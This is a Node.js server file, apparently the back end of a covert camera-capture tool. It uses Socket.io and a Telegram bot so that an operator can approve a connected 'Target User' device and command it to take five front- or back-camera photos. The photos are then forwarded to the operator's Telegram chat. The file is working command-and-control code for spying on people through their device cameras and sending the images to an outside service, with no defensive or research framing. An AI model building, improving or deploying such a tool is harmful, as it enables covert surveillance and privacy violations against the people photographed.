const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const path = require('path');
require('dotenv').config();

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_ID;

if (!token || !adminId) {
    console.error("Error: BOT_TOKEN or ADMIN_ID is missing in environment variables!");
    process.exit(1);
}

// Initialize Telegram Bot
const bot = new TelegramBot(token, { polling: true });

// Session variables for approval security
let pendingSocketId = null;
let approvedSocketId = null;
let pendingUsername = "Unknown";

// Register Telegram Menu Commands & Online Notification
bot.setMyCommands([
    { command: 'start', description: 'Start the bot and check status' },
    { command: 'approve', description: 'Authorize pending device connection' },
    { command: 'moref', description: 'Front Camera 5 Photos Capture' },
    { command: 'moreb', description: 'Back Camera 5 Photos Capture' }
]).then(() => {
    console.log('Telegram bot commands registered successfully!');
    bot.sendMessage(adminId, "🟢 **Server is Online!**\nApproval security system is active.").catch(err => {});
}).catch(err => {
    console.error('Failed to set Telegram commands:', err);
});

// Configure Multer for in-memory photo buffer storage
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Serve static frontend files
app.use(express.static(path.join(__dirname, 'public')));

// Upload Endpoint
app.post('/upload', upload.single('photo'), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).send('No file uploaded.');
        }

        await bot.sendPhoto(adminId, req.file.buffer, {
            caption: `📸 Captured (${pendingUsername}): ${req.file.originalname || 'photo.jpg'}`
        });

        res.status(200).send({ success: true });
    } catch (error) {
        console.error("Error forwarding photo to Telegram:", error);
        res.status(500).send({ success: false, error: error.message });
    }
});

// Socket.io Connection & Security Handlers
io.on('connection', (socket) => {
    console.log('Client connected:', socket.id);

    // Device connection registration request
    socket.on('register_device', (data) => {
        pendingSocketId = socket.id;
        pendingUsername = data.name || "Target User";

        bot.sendMessage(adminId, `🔔 **New Device Connection Request!**\n\n👤 Name: \`${pendingUsername}\`\n📱 Socket ID: \`${socket.id}\`\n\nType **/approve** to authorize this device.`);
    });

    socket.on('disconnect', () => {
        console.log('Client disconnected:', socket.id);
        if (socket.id === approvedSocketId) {
            approvedSocketId = null;
            bot.sendMessage(adminId, `⚠️ **Device Disconnected!** The approved device has closed the session.`);
        }
        if (socket.id === pendingSocketId) {
            pendingSocketId = null;
        }
    });
});

// Telegram Command: /start
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        bot.sendMessage(chatId, `👋 **Welcome back, Raj bhai!**\n\nSystem Status:\n- Approved Device: ${approvedSocketId ? '🟢 Connected' : '🔴 None'}\n\nCommands:\n/approve - Authorize pending device\n/moref - Front Camera Capture\n/moreb - Back Camera Capture`);
    }
});

// Telegram Command: /approve
bot.onText(/\/approve/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        if (pendingSocketId) {
            approvedSocketId = pendingSocketId;
            io.to(approvedSocketId).emit('device_approved');
            bot.sendMessage(chatId, `✅ **Device Approved Successfully!**\nUser (${pendingUsername}) is now authorized.`);
            pendingSocketId = null;
        } else {
            bot.sendMessage(chatId, "❌ No pending device request waiting for approval right now.");
        }
    }
});

// Telegram Command: /moref (Front Camera)
bot.onText(/\/moref/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        if (approvedSocketId) {
            bot.sendMessage(chatId, "📸 Front Camera se 5 photos capture ki ja rahi hain...");
            io.to(approvedSocketId).emit('capture_front');
        } else {
            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
        }
    }
});

// Telegram Command: /moreb (Back Camera)
bot.onText(/\/moreb/, (msg) => {
    const chatId = msg.chat.id;
    if (chatId.toString() === adminId.toString()) {
        if (approvedSocketId) {
            bot.sendMessage(chatId, "📸 Back Camera se 5 photos capture ki ja rahi hain...");
            io.to(approvedSocketId).emit('capture_back');
        } else {
            bot.sendMessage(chatId, "❌ **Access Denied / No Device Approved!** Type /approve first.");
        }
    }
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running successfully on port ${PORT}`);
});
